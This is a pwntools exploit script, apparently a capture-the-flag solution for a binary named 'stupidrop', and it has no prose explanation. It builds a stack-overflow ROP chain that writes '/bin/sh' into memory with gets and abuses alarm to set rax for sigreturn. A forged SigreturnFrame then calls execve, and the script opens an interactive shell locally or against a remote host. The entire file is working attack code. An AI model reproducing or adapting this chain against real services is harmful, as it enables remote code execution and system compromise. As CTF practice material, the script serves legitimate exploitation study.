from pwn import *
elf = ELF("stupidrop")
#libc = ELF("")
context.log_level = "debug"
context.arch = "amd64"

#ip,port = "",

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(remote_ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()

syscall = p64(0x40063e)
popRdi = p64(0x4006a3)
gets = p64(elf.symbols['gets'])
alarm = p64(elf.symbols['alarm'])

binshadr = p64(0x601050)

payload = b""
payload += b"0"*0x38 #till ret
payload += popRdi #write binsh to binshadr
payload += binshadr
payload += gets
payload += popRdi #using alarm to set rax to sigreturn(0xf)
payload += p64(0xf)
payload += alarm
payload += popRdi
payload += p64(0x0)
payload += alarm

frame = SigreturnFrame()
frame.rip = 0x40063e
frame.rax = 0x3b
frame.rdi = 0x601050
frame.rsi = 0x0
frame.rdx = 0x0

payload += syscall
payload += bytes(frame)

sl(payload)
sl("/bin/sh\x00")

r.interactive()